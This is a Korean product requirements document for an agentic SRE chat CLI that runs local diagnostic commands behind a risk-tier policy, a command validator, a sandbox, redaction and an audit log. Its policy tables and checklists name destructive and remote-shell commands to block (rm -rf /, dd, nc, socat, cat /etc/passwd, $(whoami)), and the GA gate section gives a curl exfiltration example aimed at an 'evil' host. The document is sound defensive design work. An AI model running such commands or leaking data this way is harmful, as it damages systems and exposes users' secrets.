# PRD: `aic chat` SRE Agent

> `aic chat`을 읽기 전용 Q&A를 넘어, 로컬에서 진단 명령을 직접 실행하고 결과를 해석하는
> **on-call SRE 어시스턴트**로 만든다. `run_command`는 기본 활성(default-on)이며 다층 안전장치
> (위험도 분류·명령 검증·샌드박스·redaction·audit)로 보호된다.

- 상태: Draft (구현 Phase 0~2 완료, GA 게이트 미해소 — §13)
- 작성일: 2026-05-22
- 관련 문서:
  - [RFC-002-AIC-CHAT-AGENTIC.md](./RFC-002-AIC-CHAT-AGENTIC.md) — 설계/단계 RFC
  - [RFC-001-CENTRALIZED-RECORD-STORE.md](./RFC-001-CENTRALIZED-RECORD-STORE.md)
- 관련 코드:
  - `aic-client/src/agent/run_command.rs` — run_command 도구·정책·검증·실행
  - `aic-client/src/agent/session.rs` — agent loop·tool 디스패치·confirm
  - `aic-client/src/agent/{tools,sandbox,types,ui}.rs` — 읽기도구·샌드박스·메시지타입·터미널 UI
  - `aic-client/src/risk_guard.rs` — `RiskLevel`·`classify`
  - `aic-client/src/redaction.rs` — 송신/출력 시크릿 마스킹
  - `aic-client/src/audit.rs` — append-only 감사 로그

## 1. 목적 / 문제 정의

SRE/개발자는 장애 진단 시 `ps`/`df`/`journalctl`/`kubectl get` 같은 명령을 반복 실행하고 그 출력을
해석한다. 기존 `aic chat`은 (1) 단발 Q&A이거나 (2) 읽기 전용 도구만 있어, "상태를 직접 확인하고
답하는" 흐름이 끊긴다. 사용자는 명령을 직접 치고, 결과를 복사해 LLM에 붙여넣고, 다시 명령을 친다.

`aic chat` SRE Agent는 이 왕복을 없앤다. 진단 요청을 받으면 모델이 **안전한 명령을 직접 실행**하고
출력을 해석해 답한다. 안전은 "기능을 끄는 것"이 아니라 "위험도에 따라 자동/확인/차단을 분기"하는
방식으로 확보한다.

## 2. 목표

### 2.1 Product Goals
- 진단 요청(`ps`, `cpu`, `memory`, `logs`, `disk`, `net` 등)을 **되묻지 않고 즉시 실행**해 답한다.
- 위험·상태 변경 명령은 **사용자 확인** 후에만 실행한다. 파괴적 명령은 **차단**한다.
- 사용자가 **무엇이 실제로 실행됐는지** 항상 볼 수 있다(provenance).
- 한 번의 `aic chat`으로 진단 → 해석 → 후속 진단을 이어간다.
- 원치 않으면 한 플래그로 읽기 전용으로 되돌릴 수 있다(`--no-run`).

### 2.2 Engineering Goals
- `run_command`는 `sh -c` 실행이되 **expansion/quote 표면을 0으로** 만드는 엄격 검증을 통과해야 한다.
- 모든 파일 접근은 **cwd 샌드박스** 내로 강제한다.
- 위험도 분류(`risk_guard`)·시크릿 마스킹(`redaction`)·감사(`audit`) 기존 인프라를 재사용한다.
- provider가 tool-calling을 미지원하면 **읽기 전용/단발 chat로 우아하게 degrade**한다.
- 출력·시간·반복에 hard cap을 둬 자원 폭주를 막는다.

## 3. 비범위 (MVP)
- **쓰기 도구**(`write_file`/`edit_file`)는 포함하지 않는다(Phase 3).
- **원격/컨테이너 샌드박스 실행**은 다루지 않는다. 명령은 로컬에서 실행된다.
- **멀티 provider tool-calling 동등성**은 범위 밖. OpenAI-compat 경로만 도구를 노출한다
  (Anthropic native tool use / CLI backend는 도구 없는 단발 응답).
- **org-level 정책 서버/원격 lockdown**은 P2.
- 자유로운 셸 스크립팅(`$`, glob, redirect, 체이닝)은 의도적으로 차단한다.

## 4. 대상 사용자
- **On-call SRE / 운영자** — 장애 시 빠른 상태 확인·해석이 필요. 1차 타깃.
- **백엔드/플랫폼 개발자** — 로컬/서버에서 프로세스·리소스·로그 진단.
- **CI/스크립트(비-TTY)** — 부차적. 확인이 필요한 명령은 자동 거부되는 안전 기본값.

## 5. MVP 범위 (현재 구현된 것)
- `aic chat` 진입 시 **run_command 기본 활성**, 읽기 도구(`read_file`/`list_dir`/`grep`/`glob`) 동시 노출.
- **3-tier 정책**(§7): Safe 자동 / NeedsConfirm 확인 / Dangerous·Unknown 차단.
- **SRE shortcut 정규화**: `ps`/`cpu`/`processes`→`ps aux | head -n 20`, `disk`→`df -h`,
  `mem`→`free -h`(Linux), `net`→`ss -tunl | head -n 50`(Linux) 등 bounded canonical 명령.
- **명령 검증기**: `$`/glob/brace/quote/backslash/redirect/`;`/`&`/`&&`/`||`/backtick/`~`/개행 차단,
  단일 `|`만 허용, segment별 절대경로·`..` 차단, file-reading 명령 path는 sandbox 내 강제,
  find/fd 위험 옵션(`-exec`/`-delete` 등) 차단.
- **실행 안전**: `env_clear` + allowlist(PATH/HOME/KUBECONFIG/AWS_PROFILE 등), process-group SIGKILL
  timeout(기본 15s/상한 30s), bounded reader(stdout/stderr 64KB cap), 출력 redaction, audit append.
- **터미널 UI**(`agent/ui.rs`): 배너/상태줄/tool 카드/confirm·차단 박스, 폭 대응, AIC_DEBUG/non-TTY 분기.
- **history/CJK**: 대화 히스토리·한글 폭(2칸) 처리.

## 6. 주요 UX 플로우

### 6.1 최초 실행 (first-run)
1. `aic chat` 진입 → ASCII 배너 + 상태줄(모드/모델/cwd/`run_command: ON`/정책).
2. (P0 권장) run_command가 셸 명령을 실행함을 1회 고지 + opt-out(`--no-run`) 안내.
3. 첫 프롬프트.

### 6.2 진단 (Safe → 자동)
1. 사용자: "메모리 상태 봐줘" / `memory`.
2. 모델이 `run_command` 호출 → shortcut 정규화 → `risk_guard` Safe → **확인 없이 실행**.
3. tool 카드에 **실제 실행 명령 + exit + duration + 출력 미리보기** 표시.
4. 모델이 출력을 해석해 답변.

### 6.3 상태 변경 (NeedsConfirm → 확인)
1. 사용자: "nginx 재시작" → 모델이 `systemctl restart nginx` 호출.
2. `risk_guard` NeedsConfirm → **confirm 박스**(command/cwd/사유, 기본 N).
3. y → 실행, n/비-TTY → `[denied]` 회신, 모델은 대안 설명.

### 6.4 위험/차단 (Dangerous·Unknown → 차단)
1. 모델/사용자가 `rm -rf /`, `$(...)`, 검증 위반 명령 시도.
2. 실행 없이 `[blocked]`(등급·사유·대안) 회신. 모델은 수동 실행/대안 안내.

### 6.5 읽기 전용 모드
- `aic chat --no-run` 또는 `AIC_AGENT_NO_RUN=1` → run_command 미노출, 읽기 도구만.

## 7. tool / run_command 정책

| tier(risk_guard) | 동작 | 예시 |
|------------------|------|------|
| **Safe** | 자동 실행 | `ps aux`, `df -h`, `journalctl --no-pager -n 100`, `cat`/`grep`, `dig name`(기본 resolver) |
| **NeedsConfirm** | TTY 확인(비-TTY 거부) | `systemctl restart`, `kubectl apply`, `git commit`, `curl https://… (GET=http.egress)`, `curl -X POST (http.write)`, `dig @server`/`nslookup name server`(dns.custom_resolver) |
| **Dangerous** | 차단 | `rm -rf`, `mkfs`, `dd`, `reboot`, `ssh`/`scp`/`nc`/`socat`/`telnet`(net.remote_access) |
| **Unknown** | 차단(보수) | subshell `$(…)`, backtick, 파싱 불가 |

- 분류 전 **shortcut 정규화**로 짧은 의도를 bounded canonical 명령으로 변환(되묻기 최소화).
- 분류 후 **실행 직전 검증기**(`validate_command`)가 메타문자/샌드박스 위반을 재차 차단(Safe라도 적용).
- 인자: `command`(필수), `timeout_secs`(기본 15·상한 30), `cwd`(sandbox 내 상대경로).

## 8. 안전 모델
- **명령 검증(lexical)**: `sh -c` expansion/quote-removal 우회를 원천 차단(`$`/glob/quote/backslash/
  redirect/체이닝/backtick/`~` 금지, 단일 `|`만 허용).
- **샌드박스**: 파일 인자·cwd를 정규화 후 root 하위로 강제(절대경로·`..`·symlink 탈출 거부).
- **위험도 분류**: `risk_guard::classify`(파이프 세그먼트 max, subshell→Unknown).
- **실행 격리**: `env_clear`+allowlist(시크릿 env 미전달), process-group kill timeout, 출력 cap.
- **시크릿 보호**: stdout/stderr·명령 echo·audit 값에 `redaction::redact` 적용.
- **감사**: 자동/확인/거부/차단/검증실패 모든 시도를 `audit::append`로 기록.
- **degrade 안전**: provider tool 미지원 시 읽기/단발 chat로 폴백(기능은 사라지되 위험 없음).

## 9. Opt-out / Rollback
- **세션 opt-out**: `aic chat --no-run` / `--read-only`.
- **환경 opt-out**: `AIC_AGENT_NO_RUN=1` (CI/스크립트 기본 안전화에 사용).
- **즉시 rollback**: run_command는 별도 도구 경로이므로, 비활성 시 읽기 전용 agent로 회귀(코드 롤백 불요).
- **(P1) 영구 비활성**: config(`agent.run_command=false`) 도입 — 사용자/org 기본값.

## 10. Observability / Debug
- **일반 모드**: tool 카드(명령·exit·duration·미리보기), 상태줄(run on/off, 모델, cwd).
- **AIC_DEBUG**: `adbg!`/`debug_log!` 스트림(`iter n/8`, `tool_specs=N`, `run_command=on|off`,
  `provider_tools=enabled|degraded|off`, `tool_call`/`tool_result`, `args_len`) + 타임스탬프, 장식 최소.
  banner는 AIC_DEBUG에서도 계속 보이며, 색상은 NO_COLOR/non-TTY 정책을 따른다.
- **(P1) correlation id**: 세션 `run_id` + tool call별 `run_id.seq`(=`corr`)가 AIC_DEBUG
  `tool_call`/`tool_result`, run_command command card, audit JSON(`corr`), degrade audit(`run_id`)에
  공통으로 찍혀 한 호출 단위로 추적 가능(stdout LLM 답변에는 미노출).
- **audit 로그**: append-only(`corr`·시도 종류·redacted 명령·cwd·`risk_level`·`rule`). RFC-001 통합은 후속.
  (risk level/rule은 audit에만 기록되며 AIC_DEBUG 스트림에는 노출하지 않는다.)
- **(P2-1) in-memory 조회 slash 명령**: agent REPL에서 `/help`·`/last [N]`·`/raw [seq|corr]`로
  세션 내 tool 실행(ring 상한 20)을 조회. 출력은 화면 전용(LLM 미전송, history 미오염), 저장 시 항상
  redact(cap 시 라벨). `/local`(alias `/sys`·`/snapshot`, `/local <section>`)은 내장 sysinfo probe
  (date/host/os/uptime/disk/memory/ip/route/ports)를 개별 bounded Safe 명령으로 실행한 로컬 스냅샷
  (run_command 프리미티브 재사용). **기본은 redacted 스냅샷을 tool 없는 stateless 단발 LLM 호출로 분석
  요약(history 미push, 스냅샷=데이터로만 취급해 injection 방지)**, 실패(설정없음/오류/timeout) 시 raw
  fallback. `--raw`/`-r`=원본만, `--analyze`/`-a`=분석 강제, `AIC_LOCAL_NO_ANALYZE=1`=분석 끔. 분석 출력은
  CLI 친화 markdown subset을 ANSI 구조로 렌더(TTY)/구조만(NO_COLOR)/raw(파이프), prompt에 subset 제약.
  강조색 amber(`38;5;214`), 분석 진행은 amber spinner(provider 라벨, TTY-only).
- **(P2-1) `/diagnose "<증상>"`**: read-only SRE 진단. 증상→결정적 카테고리(cpu/memory/disk/network/
  process/generic)→고정 Safe probe 수집→증거+증상을 tool-less stateless 단발 분석(가설→증거 인용→다음
  안전 확인, history 미push, injection 방지). `--raw`=증거만, no-arg=일반 health, 실패 시 raw fallback,
  audit kind=`diagnose`. agentic 적응형 probe 선택은 P2.
- `/explain-last [--raw] [seq|corr]`: 최근(또는 지정) tool 기록을 증거로 원인/다음확인 분석(새 명령 없음).
  `/incident [--raw] [name]`: 시스템 스냅샷+git read-only 증거(repo)+최근 기록을 묶어 분석(name은 라벨,
  셸 명령 미포함). 둘 다 tool-less stateless 단발(history 미push)·data-only injection 방지·raw fallback,
  audit kind=`explain-last`/`incident`.
- **(P0, LLM 미호출)** `/doctor`(자체 상태: provider/model·tool-calling·run_command·env flag set/unset만,
  secret 미노출), `/timeline [N]`(tool 기록 시간순), `/compare`(고정 Safe 스냅샷 line-set diff, baseline
  세션 보관), `/bundle [name]`(인시던트 증거 redacted markdown을 `~/.aic/bundles/`에 저장, dir 0700/file
  0600, name은 파일 라벨). 보류 roadmap: `/runbook`·`/fix-preview`·`/config`·watch daemon·persistent `/audit`.
- **(P0) Probe Catalog + `/triage`**: 읽기 전용 probe를 `agent::probes` catalog(ProbeSpec: id/category/
  tags/description/OS별 command/max_lines)로 단일화(local 섹션 + process + git read-only). `/local`·
  `/compare`·`/diagnose`·`/incident`·`/bundle`이 catalog 참조. `/triage [--run] [topic]`(mac-slow/web/
  disk/memory/cpu/network/build-fail/generic, unknown→generic+원 라벨)은 체크리스트+후보 probe를 렌더,
  `--run`이면 run_command 활성 시 probe 실행(LLM/history 미사용). topic은 라벨 전용(셸 명령 미포함).
  TTY는 **reedline 기반 선택형 후보 패널**(`/` 입력 즉시 패널 열림,
  Tab으로도 열기/순환, ↑↓ 이동·선택행 highlight, Enter 선택, Esc 닫기, `/local <section>` 섹션;
  prefix + subsequence fuzzy; 삽입은 이름만; NO_COLOR/non-TTY 정책 준수)를 지원. **(P2-2) persistent audit 파일 조회(`/audit tail`)는 보류.**
- **(P0) 텔레메트리**: tool-calling degrade 발생률(provider 미지원 폴백 빈도)을 계측해 §13 게이트 판단.

## 11. Acceptance Criteria (MVP 완료 기준)
- AC1: `aic chat`(무플래그)에서 `ps`/`cpu`/`memory`/`disk`/`net` 입력 시 **되묻지 않고** bounded 명령 자동 실행·해석.
- AC2: `systemctl restart`류는 confirm 후에만 실행, 비-TTY에선 `[denied]`.
- AC3: `rm -rf /`, `$(...)`, `cat /etc/passwd`, `find . -exec`, glob/quote/redirect는 **실행 없이 차단**.
- AC4: tool 카드에 **실제 실행 명령**(정규화 결과 포함)·exit·duration이 표시된다.
- AC5: 출력에 시크릿 패턴이 있으면 `REDACTED`로 마스킹된다. 자식 프로세스에 토큰 env가 전달되지 않는다.
- AC6: 30s 초과 명령은 process-group kill로 종료되고 부분 출력+timeout 표기.
- AC7: `--no-run`/`AIC_AGENT_NO_RUN`로 run_command가 미노출(읽기 전용).
- AC8: provider tool 미지원 시 crash 없이 읽기/단발 chat로 degrade.
- AC9: 모든 실행/차단/거부 시도가 audit에 기록된다.
- AC10: 전체 빌드 + lib 테스트 + run_command 단위 테스트(~40) green.

## 12. Manual smoke checklist
- [ ] `aic chat` → 배너/상태줄 표시, `run_command: ON`.
- [ ] `ps` → `ps aux | head -n 20` 자동 실행, 카드에 명령/exit 표시.
- [ ] `memory`(Linux `free -h` / macOS 대체) 자동 실행.
- [ ] `df -h` 자동, `journalctl --no-pager -n 100`(Linux) 자동.
- [ ] `systemctl restart nginx` → confirm 박스, n 입력 시 미실행.
- [ ] `rm -rf /tmp/x` → `[blocked]` Dangerous.
- [ ] `echo $(whoami)` / `cat /etc/passwd` / `ls *.rs` → `[blocked]` 검증/Unknown.
- [ ] `curl https://example.com`(GET) → NeedsConfirm(http.egress) confirm, 비-TTY 자동 거부. `curl -X POST …` → confirm(http.write).
- [ ] `aic doctor --probe-tools` → ok/unsupported/degraded/error/skip 진단(세션 시작 자동 아님).
- [ ] 비밀키를 출력하는 명령 → `REDACTED` 확인.
- [ ] `sleep 60`류 장기 명령(검증 통과 케이스) → 30s timeout 종료.
- [ ] `aic chat --no-run` → run_command 미노출.
- [ ] 파이프 출력(`aic chat … | cat`) 비-TTY → ANSI 색상 없음(plain), banner/status는 stderr에 plain으로 출력, confirm은 거부(비-TTY).
- [ ] `AIC_DEBUG=1` → `iter n/8`·`tool_specs`·`run_command`·`provider_tools`·`tool_call`/`tool_result`·timestamp 디버그 출력(banner 유지, 색상은 NO_COLOR/non-TTY 정책 적용).

## 13. GA Gate (P0 — 반영 완료, P1 강화 잔여)
- **G1. tool-calling live probe** (✅ P0 반영): (a) **opt-in live probe** `aic doctor --probe-tools`
  추가 — 설정된 provider에 최소 tool spec으로 `send_messages` 1회를 보내 ok/unsupported/degraded/
  error/skip(credential 없음)을 진단한다(세션 시작 시 자동 수행 안 함). (b) 런타임 degrade 시
  **1회 명시 고지** + AIC_DEBUG `provider_tools=degraded` + audit `tool_calling_degraded`
  (provider/model/err_kind) 기록. (P1) 자동 캐시 probe + degrade 발생률 텔레메트리.
- **G2. GET egress / exfil 정책** (✅ P0 반영): `curl/wget`을 **GET 포함 전부 NeedsConfirm**으로
  분류(GET=`http.egress`, POST/upload/output=`http.write`). Safe 자동실행 제거로 GET 쿼리스트링
  exfil(`curl https://evil/?d=<파일내용>`)이 비-TTY에서 자동 거부된다. P1로 DNS custom resolver
  NeedsConfirm(`dns.custom_resolver`)·원격 네트워크 도구 명시 Dangerous(`net.remote_access`)를
  추가 반영. **(P2) 외부 egress host allowlist 실허용 + injection 레드팀.**

## 14. 리스크 / 완화
| 리스크 | 심각도 | 완화 |
|--------|--------|------|
| GET 기반 데이터 유출 | 높음 | G2 정책 + 레드팀 (GA 게이트) |
| 기능 silent 부재(degrade) | 높음 | G1 라이브 probe + 텔레메트리 |
| default-on 무고지 실행 | 중 | first-run 고지 + provenance(tool 카드) |
| Safe 오분류 자동 실행 | 중 | safelist 보수적 유지·검증기 이중 차단·audit 사후 점검 |
| 시크릿 출력 노출 | 중 | redaction(패턴 커버리지 P1 측정) |
| 플랫폼 갭(unix 가정) | 중 | 지원 OS 명시 + CI 매트릭스(P1) |
| 비-TTY Safe 자동 실행 | 중 | 정책 확정(P1), `AIC_AGENT_NO_RUN` 권장 |
| 자원 폭주 | 낮음 | timeout/output cap/MAX_ITERATIONS=8 |

## 15. P1 / P2 Backlog
**P1 (GA 전후 정리)**
- redaction 커버리지 측정(kubectl/aws/journalctl 실출력 기준).
- 비-TTY Safe 자동 실행 정책 확정.
- 크로스플랫폼 지원 범위 + CI 매트릭스(macOS/Linux).
- audit 내구성(보존·조회·RFC-001 통합).
- config 기반 영구 opt-out / per-command allow·deny.
- 승인 UX 고도화(`always`(세션) / `view` / `explain`).
- shortcut discovery(`/shortcuts`, `--list-shortcuts`).

**P2 (확장)**
- 멀티 provider tool-calling(Anthropic native).
- org-level 정책/강제 lockdown.
- 후속 **argv runner**(shell 비경유 배열 인자) — 별도 보안 검토 게이트.
- 쓰기 도구(`write_file`/`edit_file`) + diff 미리보기(Phase 3).
- 대화 세션 저장/복원, tool 출력 스트리밍.

## 16. 참고: 미해결 결정 (PRD 확정 대상)
- D1: default-on 유지 정당화 + org lockdown 제공 여부.
- D2: Safe allowlist 거버넌스(유지·리뷰 프로세스).
- D3: 네트워크 egress 정책(G2와 동일).
- D4: 상태 변경 명령(systemctl/kubectl apply) confirm 범위 확정.
- D5: 비-TTY 동작 매트릭스(Safe 자동 실행 허용 여부).
- D6: audit 보증 수준·저장소.
- D7: 지원 플랫폼.
